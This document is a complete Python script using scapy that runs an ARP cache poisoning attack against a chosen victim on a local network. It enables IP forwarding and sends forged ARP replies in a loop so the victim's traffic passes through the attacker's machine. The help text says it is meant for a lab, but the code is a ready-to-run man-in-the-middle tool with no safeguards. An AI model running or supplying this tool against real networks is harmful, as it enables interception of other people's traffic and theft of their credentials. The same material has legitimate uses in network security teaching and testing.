#!/usr/bin/env python3
import argparse
import os
import time
from scapy.all import ARP, Ether, get_if_hwaddr, sendp, srp1


def resolve_mac(interface, ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    reply = srp1(packet, iface=interface, timeout=2, verbose=False)
    if reply is None:
        raise SystemExit(f"could not resolve {ip} on {interface}")
    return reply[Ether].src


def main():
    parser = argparse.ArgumentParser(description="Poison a victim's ARP cache in the lab.")
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("--victim", required=True)
    parser.add_argument("--victim-mac", help="optional; resolved automatically when omitted")
    parser.add_argument("--spoof", action="append", required=True)
    args = parser.parse_args()

    os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null")
    attacker_mac = get_if_hwaddr(args.interface)
    if not args.victim_mac:
        args.victim_mac = resolve_mac(args.interface, args.victim)
    packets = [
        Ether(dst=args.victim_mac, src=attacker_mac)
        / ARP(op=2, psrc=spoof_ip, hwsrc=attacker_mac, pdst=args.victim, hwdst=args.victim_mac)
        for spoof_ip in args.spoof
    ]
    print(f"poisoning {args.victim} with {attacker_mac}; Ctrl-C to stop", flush=True)
    try:
        while True:
            for packet in packets:
                sendp(packet, iface=args.interface, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("stopped", flush=True)


if __name__ == "__main__":
    main()
